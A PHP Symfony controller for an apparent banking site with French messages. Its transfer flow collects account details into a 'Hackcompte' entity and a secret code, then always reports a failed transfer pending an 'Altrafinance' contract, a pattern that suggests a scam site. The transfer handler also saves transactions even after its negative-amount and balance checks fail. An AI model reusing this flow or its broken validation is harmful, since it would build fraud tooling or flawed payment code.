<?php

namespace App\Controller;

use App\Entity\Code;
use App\Entity\Hackcompte;
use App\Entity\Transaction;
use App\Entity\User;
use App\Form\ChangePasswordType;
use App\Form\CodeType;
use App\Form\HackcompteType;
use App\Form\TransactionType;
use App\services\ManageApiServices;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;

class AccountController extends AbstractController
{

    private $entityManager;
    public function __construct(EntityManagerInterface $entityManager ) {
        $this->entityManager = $entityManager;
    }


    #[Route('/account', name: 'account')]
    public function index(): Response
    {
        $this->denyAccessUnlessGranted('IS_AUTHENTICATED_FULLY');
        /** @var \App\Entity\User $user */
        $user = $this->getUser();
        $status = $user->getIsActive();

        if ($this->isGranted("ROLE_USER") && $status == false){
            return $this ->redirectToRoute('default');
        }


        return $this->render('account/index.html.twig');
    }


    #[Route('/account/infos', name: 'account_infos')]
    public function infos(ManageApiServices $manageApiServices): Response
    {
        return $this->render('account/infos.html.twig',[
           // 'imageservices'=>$manageApiServices->imageservices(),
        ]);
    }


    #[Route('/account/pass', name: 'account_pass')]
    public function pass(ManageApiServices $manageApiServices ,Request $request ,UserPasswordHasherInterface $encoder): Response
    {
        $notification = null;

        $user = $this->getUser();
        $form = $this->createForm(ChangePasswordType::class, $user);

        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $old_pwd = $form->get('old_password')->getData();

            if ($encoder->isPasswordValid($user, $old_pwd)) {
                $new_pwd = $form->get('new_password')->getData();
                $password = $encoder->hashPassword($user, $new_pwd);

                $user->setPassword($password);
                $this->entityManager->flush();
                $notification = "Votre mot de passe a bien été mis à jour.";
            } else {
                $notification = "Votre mot de passe actuel n'est pas le bon";
            }
        }

        return $this->render('account/pass.html.twig',[
           // 'imageservices'=>$manageApiServices->imageservices(),
            'form' => $form->createView(),
            'notification' => $notification
        ]);
    }


    #[Route('/account/virement', name: 'account_virement')]
    public function virement(ManageApiServices $manageApiServices): Response
    {
        return $this->render('account/virement.html.twig',[
         //   'imageservices'=>$manageApiServices->imageservices(),
        ]);
    }

    #[Route('/account/virement/transaction', name: 'account_virement_transaction')]
    public function transaction(Request $request , ManageApiServices $manageApiServices): Response
    {
        
        $transaction = new Transaction();
        
        $notif = null;

        $form = $this->createForm(TransactionType::class, $transaction);

        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $transaction = $form->getData();
            
         
            $montant = $form["montant"]->getData();
   
         

            /** @var \App\Entity\User $user */
            $user = $this->getUser();
            $solde = $user->getSolde();
            
    
            
            // si montant est negatif
            if($montant < 0){
                $notif = "Vous ne pouvez pas faire un virement avec un montant négatif";
            }
            

            if($montant > $solde){
                $notif = "Vous n'avez pas assez d'argent sur votre compte";
            }
            
               
                 $this->entityManager->persist($transaction);
                  $this->entityManager->flush();
               return $this->redirectToRoute("transmission");

           
        }


        return $this->render('account/transaction.html.twig',[
            'form' => $form->createView(),
            'notif' => $notif,
        ]);
    }

    #[Route('/account/virement/transaction/compte', name: 'account_virement_transaction_compte')]
    public function compte(Request $request , ManageApiServices $manageApiServices): Response
    {
        $compte = new Hackcompte();

        $form = $this->createForm(HackcompteType::class, $compte);

        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $compte = $form->getData();
            $this->entityManager->persist($compte);
            $this->entityManager->flush();

            return $this->redirectToRoute("transmission_code");
        }


        return $this->render('account/compte.html.twig',[
            'form' => $form->createView(),
           // 'imageservices'=>$manageApiServices->imageservices(),
        ]);
    }


    #[Route('/account/virement/transaction/code/', name: 'account_virement_transaction_code')]
    public function code(Request $request , ManageApiServices $manageApiServices)
    {
      $notification = null;

        $code = new Code();


        $form = $this->createForm(CodeType::class, $code);

        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid() ) {
            $code = $form->getData();
            $this->denyAccessUnlessGranted('IS_AUTHENTICATED_FULLY');

            /** @var \App\Entity\User $user */
            $user = $this->getUser();

            $codeUser = $user->getCode();

            $enterCode = $code->getCode();

            if ( $codeUser === $enterCode){
                return $this->redirectToRoute("transmission_mess");
            }

            $notification = "Votre code secret est invalide" ;

            unset($entity);
            unset($form);

            $user = new User();
            $form = $this->createForm(CodeType::class, $user);

        }

        return $this->render('account/code.html.twig',[
            'form' => $form->createView(),
            //'imageservices'=>$manageApiServices->imageservices(),
            'notification' => $notification
        ]);
    }

    #[Route('/account/virement/transaction/mess', name: 'account_virement_transaction_mess')]
    public function mess( ManageApiServices $manageApiServices)
    {
        $notification = "Transaction échoué ";
        $motif = "Vous avez pas encore finalisée votre contrat avec Altrafinance";

        return $this->render('account/mess.html.twig',[
            'notification' => $notification,
            'motif' => $motif,
           // 'imageservices'=>$manageApiServices->imageservices(),
        ]);
    }

}
